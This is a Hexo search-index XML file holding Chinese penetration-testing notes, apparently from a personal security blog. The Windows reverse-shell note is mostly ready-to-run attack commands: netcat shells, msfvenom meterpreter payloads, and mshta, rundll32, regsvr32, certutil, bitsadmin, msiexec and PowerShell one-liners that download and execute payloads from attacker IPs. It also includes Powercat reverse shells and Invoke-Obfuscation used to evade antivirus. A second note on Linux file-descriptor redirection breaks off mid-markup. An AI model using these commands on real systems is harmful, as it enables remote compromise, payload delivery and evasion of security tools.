<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0x09 - Web安全基础-Windows反弹shell</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-Windows%E5%8F%8D%E5%BC%B9shell.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-Windows%E5%8F%8D%E5%BC%B9shell.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>windows反弹shell</p><h1 id="各种windows反弹shell的命令"><a href="#各种windows反弹shell的命令" class="headerlink" title="各种windows反弹shell的命令"></a>各种windows反弹shell的命令</h1><h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><h3 id="NC正向Shell"><a href="#NC正向Shell" class="headerlink" title="NC正向Shell"></a>NC正向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -lvvp 6666 -e cmd.exe</span><br><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc 192.168.1.106 6666</span><br></pre></td></tr></table></figure><p>原理：</p><p>被控端将<code>cmd.exe</code>重定向到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p><h3 id="NC反向Shell"><a href="#NC反向Shell" class="headerlink" title="NC反向Shell"></a>NC反向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -e cmd.exe 192.168.1.105 7777</span><br></pre></td></tr></table></figure><p>原理：<br>被控端将<code>cmd.exe</code>重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p><h2 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h2><p><code>Mshta.exe</code>是用于负责解释运行<code>HTA</code>(HTML应用程序)文件的Windows OS实用程序。 可以运行<code>JavaScript</code>或<code>VBScript</code>的HTML文件。</p><h3 id="通过Metasploit的HTA-Web-Server模块发起HTA攻击"><a href="#通过Metasploit的HTA-Web-Server模块发起HTA攻击" class="headerlink" title="通过Metasploit的HTA Web Server模块发起HTA攻击"></a>通过<code>Metasploit</code>的<code>HTA Web Server</code>模块发起HTA攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target 1</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; exploit –j</span><br></pre></td></tr></table></figure><p>目标机执行：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192.168</span>.<span class="number">78.117</span>:<span class="number">8080</span>/<span class="number">9</span>A5Iiz.hta</span><br></pre></td></tr></table></figure><h3 id="通过Msfvenom生成恶意HTA文件发起攻击"><a href="#通过Msfvenom生成恶意HTA文件发起攻击" class="headerlink" title="通过Msfvenom生成恶意HTA文件发起攻击"></a>通过<code>Msfvenom</code>生成恶意<code>HTA</code>文件发起攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成hta文件</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.78.117 lport=4444 -f hta-psh -o 1.hta</span><br><span class="line"><span class="comment">#开启http服务</span></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">python3 -m http.server</span><br><span class="line"><span class="comment">#设置监听</span></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.78.117 -P 4444</span><br><span class="line"><span class="comment">#目标机器发起请求</span></span><br><span class="line">mshta.exe http://192.168.78.117:8000/1.hta</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210875.png" alt="image-20221115020725743"></p><h3 id="通过Cobaltstrike生成恶意HTA文件发起攻击"><a href="#通过Cobaltstrike生成恶意HTA文件发起攻击" class="headerlink" title="通过Cobaltstrike生成恶意HTA文件发起攻击"></a>通过<code>Cobaltstrike</code>生成恶意<code>HTA</code>文件发起攻击</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210876.png" alt="image-20221115020758901" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210877.png" alt="image-20221115020825604" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210878.png" alt="image-20221115020909001" style="zoom:50%;" /><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">139.155</span>.<span class="number">49.43</span>:<span class="number">8088</span>/download/file.ext</span><br></pre></td></tr></table></figure><h2 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h2><p><code>Rundll32.exe</code>与Windows操作系统相关，它允许调用从<code>DLL</code>导出的函数(16位或32位)，并将其存储在适当的内存库中。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32</a></p></blockquote><h3 id="通过Msfvenom生成反弹shell的dll发起Rundll32攻击"><a href="#通过Msfvenom生成反弹shell的dll发起Rundll32攻击" class="headerlink" title="通过Msfvenom生成反弹shell的dll发起Rundll32攻击"></a>通过Msfvenom生成反弹shell的dll发起Rundll32攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=5533 -f dll &gt; mingy.dll</span><br><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 139.155.49.43 -P 5533</span><br></pre></td></tr></table></figure><h4 id="本地加载"><a href="#本地加载" class="headerlink" title="本地加载"></a>本地加载</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43:8000/</span><br><span class="line">mingy.dll&#x27;,\&quot;c:\mingy.dll\&quot;)</span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\mingy.dll</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352380.png" alt="image-20221115133150879"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352381.png" alt="image-20221115133204224"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352382.png" alt="image-20221115133218151"></p><h4 id="利用smb服务远程加载"><a href="#利用smb服务远程加载" class="headerlink" title="利用smb服务远程加载"></a>利用smb服务远程加载</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.105 lport=5555 -f dll -o mingy.dll</span><br><span class="line"></span><br><span class="line">impacket-smbserver dll /root/</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352383.png" alt="image-20221115133319085"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL \\<span class="number">192.168</span>.<span class="number">1.105</span>\dll\mingy.dll</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352384.png" alt="image-20221115133341265"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352385.png" alt="image-20221115133354716"></p><h3 id="通过Metasploit的SMB-Delivery模块发起Rundll32攻击"><a href="#通过Metasploit的SMB-Delivery模块发起Rundll32攻击" class="headerlink" title="通过Metasploit的SMB Delivery模块发起Rundll32攻击"></a>通过Metasploit的SMB Delivery模块发起Rundll32攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">rundll32.exe \\192.168.78.117\GylDS\test.dll,0</span><br></pre></td></tr></table></figure><h3 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=7777 -f hta-psh &gt; 44.hta</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer shell http://139.155.49.43 /44.hta C:\windows\temp\44.hta</span><br><span class="line"></span><br><span class="line">rundll32.exe url.dll,OpenURL 44.hta</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352386.png" alt="image-20221115133533811"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352387.png" alt="image-20221115133551772"></p><h2 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h2><p><code>Regsvr32.exe</code>是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。<code>Regsvr32.exe</code>安装在Windows XP和Windows后续版本的 <code>%systemroot%\System32</code>  文件夹中。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/regsvr32">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/regsvr32</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">语法:Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt;</span><br><span class="line">/u - 注销服务器</span><br><span class="line">/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载</span><br><span class="line">/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用</span><br><span class="line">/s - 沉默; 不显示消息框</span><br></pre></td></tr></table></figure><h3 id="通过Metasploit的Web-Delivery模块启动Regsvr32"><a href="#通过Metasploit的Web-Delivery模块启动Regsvr32" class="headerlink" title="通过Metasploit的Web Delivery模块启动Regsvr32"></a>通过Metasploit的Web Delivery模块启动Regsvr32</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> target 3</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> payload </span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> lhost 192.168.78.117 </span><br><span class="line">msf exploit (web_delivery)&gt; exploit –j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.78.117:8080/NE67gb2mbfQt.sct scrobj.dll</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352388.png" alt="image-20221115133738639"></p><h2 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h2><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文件以获得meterpreter会话。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=6666 -f exe &gt; 44.exe</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://139.155.49.43/44.exe c:\windows\temp\44.exe &amp; start c:\windows\temp\44.exe</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://139.155.49.43/44.exe delete</span><br></pre></td></tr></table></figure><p>缓存文件位置：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><blockquote><p><a href="https://docs.microsoft.com/zh-cn/powershell/">https://docs.microsoft.com/zh-cn/powershell/</a></p><p><a href="https://www.freebuf.com/articles/web/220046.html">https://www.freebuf.com/articles/web/220046.html</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/powershell">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/powershell</a></p></blockquote><h3 id="常用参数解释"><a href="#常用参数解释" class="headerlink" title="常用参数解释"></a>常用参数解释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span><br><span class="line">Noexit（-Noe）：执行后不退出Shell。</span><br><span class="line">EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=8899 -f psh-reflection -o shell.ps1</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352389.png" alt="image-20221115134120120"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://139.155.49.43/shell.ps1’);shell.ps1&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352390.png" alt="image-20221115134131585"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352391.png" alt="image-20221115134145072"></p><h3 id="通过PowerShell发动Powercat攻击"><a href="#通过PowerShell发动Powercat攻击" class="headerlink" title="通过PowerShell发动Powercat攻击"></a>通过PowerShell发动Powercat攻击</h3><p><code>Powercat</code>是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的<code>netcat</code>，因为它集成支持经过编码的有效载荷。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/besimorhino/powercat.git</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">powershell -c <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/powercat.ps1&#x27;);powercat -c 47.101.214.85 -p 12345 -e cmd&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352392.png" alt="image-20221115134251465"></p><h3 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; exploit -j</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352393.png" alt="image-20221115134318824"></p><h3 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h3><p><code>PowerShell</code>允许客户端通过执行<code>cscript.exe</code>来运行<code>wsf</code>、<code>js</code>和<code>vbscript</code>脚本。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=7777 -f vbs -o 3.vbs</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">python3 -m http.server</span><br><span class="line"></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 139.155.49.43 -P 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell.exe -c <span class="string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43 :8000/3.vbs&#x27;,\&quot;<span class="variable">$env</span>:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;<span class="variable">$env</span>:temp\test.vbs\&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352394.png" alt="image-20221115134429698"></p><h3 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h3><p>PowerShell允许客户端执行bat文件。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/windows/powershell_reverse_tcp lhost=139.155.49.43 lport=8888 -o 1.bat</span><br><span class="line"></span><br><span class="line">msf &gt; handler -p cmd/windows/powershell_reverse_tcp -H 172.17.0.2 -P 8888</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://139.155.49.43:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352395.png" alt="image-20221115134521965"></p><h2 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h2><h3 id="通过Metasploit启动msiexec攻击"><a href="#通过Metasploit启动msiexec攻击" class="headerlink" title="通过Metasploit启动msiexec攻击"></a>通过Metasploit启动msiexec攻击</h3><p>Windows OS安装有一个Windows安装引擎，MSI包使用<code>msiexe.exe</code>来解释安装。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=9999 -f msi &gt; 1.msi</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line">msf &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 172.17.0.2 -P 9999</span><br><span class="line"></span><br><span class="line">msiexec /q /i http://139.155.49.43:8000/1.msi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151346510.png" alt="image-20221115134658272"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352396.png" alt="image-20221115134718049"></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="通过Metasploit生成恶意exe文件发起攻击"><a href="#通过Metasploit生成恶意exe文件发起攻击" class="headerlink" title="通过Metasploit生成恶意exe文件发起攻击"></a>通过Metasploit生成恶意exe文件发起攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.78.117 LPORT=4445 -f exe -o 1.exe</span><br><span class="line"></span><br><span class="line">python –m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.78.117 -P 4445</span><br><span class="line"></span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.78.117:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);start 1.exe</span><br><span class="line"></span><br><span class="line">powershell -ep bypass -nop -w hidden (new-object system.net.webclient).downloadfile(<span class="string">&#x27;http://192.168.78.117:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);start-process 1.exe</span><br></pre></td></tr></table></figure><h2 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h2><blockquote><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p></blockquote><h3 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line">Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352397.png" alt="image-20221115134926417"></p><h3 id="设置混淆脚本代码位置"><a href="#设置混淆脚本代码位置" class="headerlink" title="设置混淆脚本代码位置"></a>设置混淆脚本代码位置</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath C:\Users\mingy\Desktop\mx\Invoke-Obfuscation\pp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352398.png" alt="image-20221115134958565"></p><h3 id="选择混淆方式为-TOKEN-ALL-1"><a href="#选择混淆方式为-TOKEN-ALL-1" class="headerlink" title="选择混淆方式为 TOKEN\ALL\1"></a>选择混淆方式为 TOKEN\ALL\1</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151350904.png" alt="image-20221115135038487"></p><h3 id="保存混淆之后的脚本"><a href="#保存混淆之后的脚本" class="headerlink" title="保存混淆之后的脚本"></a>保存混淆之后的脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out ppp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352399.png" alt="image-20221115135103578"></p><h3 id="执行未混淆前脚本，被阻止"><a href="#执行未混淆前脚本，被阻止" class="headerlink" title="执行未混淆前脚本，被阻止"></a>执行未混淆前脚本，被阻止</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352400.png" alt="image-20221115135119671"></p><h3 id="执行混淆之后脚本可bypass-av"><a href="#执行混淆之后脚本可bypass-av" class="headerlink" title="执行混淆之后脚本可bypass av"></a>执行混淆之后脚本可bypass av</h3><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x09 - Web安全基础-Linux反弹shell</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-Linux%E5%8F%8D%E5%BC%B9shell.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-Linux%E5%8F%8D%E5%BC%B9shell.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Linux反弹shell</p><h1 id="Linux标准文件描述符"><a href="#Linux标准文件描述符" class="headerlink" title="Linux标准文件描述符"></a>Linux标准文件描述符</h1><h2 id="文件描述符简介"><a href="#文件描述符简介" class="headerlink" title="文件描述符简介"></a>文件描述符简介</h2><p>Linux系统将所有设备都当作文件来处理，而Linux用文件描述符来标识每个文件对象。当Linux启动的时候会默认打开三个文件描述符。</p><p>注意:</p><ul><li>文件描述符是和每一个文件对应的！！！！！</li><li>一个文件标识符表示一个文件，如<code>0</code>表示默认设备键盘</li></ul><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th><th>默认设备</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td><td>默认设备键盘</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td><td>默认设备显示器</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td><td>默认设备显示器</td></tr></tbody></table><p>我们与计算机之间的交互是我可以输入一些指令之后它给我一些输出。</p><ul><li>文件描述符<code>0</code>：理解为我和计算机交互时的<strong>输入</strong>，而这个输入默认是指向<strong>键盘</strong>的;</li><li>文件描述符<code>1</code>：理解为我和计算机交互时的<strong>输出</strong>，而这个输出默认是指向<strong>显示器</strong>的；</li><li>文件描述符<code>2</code>：理解为我和计算机交互时，计算机<strong>出现错误时的输出</strong>，而这个输出默认是和文件描述符1指向一个位置——<strong>显示器</strong>;</li></ul><p><strong>注意：</strong></p><ul><li><code>&gt;</code>表示输出，<code>&lt;</code>表示输入,前面加上数字表示某种<strong>重定向</strong>的方式。下面会讲到</li><li>在默认这条，<code>0，1，2</code>文件描述符对应这上面的三个输入或者输出设备。但是这种绑定关系是可以更改的。下面将更改数字<code>0，1，2</code>所对应的文件（即比如将1对应的默认输出设备显示器文件改为test输出）</li></ul><h2 id="更改标准输出的位置"><a href="#更改标准输出的位置" class="headerlink" title="更改标准输出的位置"></a>更改标准输出的位置</h2><ol><li>把标准输出位置更改到<code>test</code>文件中：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec 1&gt; test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此处1表示标准输出的意思</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将标准输出重定向到<span class="built_in">test</span>的文件里，这个时候我们的终端不会显示出标准输出</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在<span class="built_in">test</span>文件里我们可以查看到命令执行的结果</span></span><br></pre></td></tr></table></figure><ol start="2"><li>把标准错误输出位置更改到<code>test</code>文件种：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec 2&gt; test</span><br></pre></td></tr></table></figure><ol start="3"><li>把当前标准输出重定向到<code>test</code>文件中：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;lst&#x27; 1&gt; test</span><br><span class="line">cat test</span><br><span class="line">lst</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同上，1&gt;表示将输出重定向给<span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><h2 id="更改标准输入的位置"><a href="#更改标准输入的位置" class="headerlink" title="更改标准输入的位置"></a>更改标准输入的位置</h2><ol><li>从键盘输入，把输入写入<code>user</code>变量,用<code>read</code>命令</li></ol><p>即将输入的内容写入<code>user</code>这个变量<br>另外在<code>bash</code>中，用<code>$</code>加变量名，表示一个变量，如<code>$user</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜ ~ ➜  read user</span><br><span class="line">testtest</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一步是写入</span></span><br><span class="line">➜ ~ ➜  echo $user</span><br><span class="line">testtest</span><br></pre></td></tr></table></figure><ol start="2"><li>把test文件中的内容重定向到标准输入：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜ ~ ➜  read user 0&lt; test</span><br><span class="line">➜ ~ ➜  echo $user</span><br><span class="line">lst</span><br></pre></td></tr></table></figure><h2 id="分配自己的文件描述符"><a href="#分配自己的文件描述符" class="headerlink" title="分配自己的文件描述符"></a>分配自己的文件描述符</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#分配文件描述符</span></span><br><span class="line">数字+&gt;+文件对象</span><br><span class="line">如  8&gt;temp</span><br><span class="line"><span 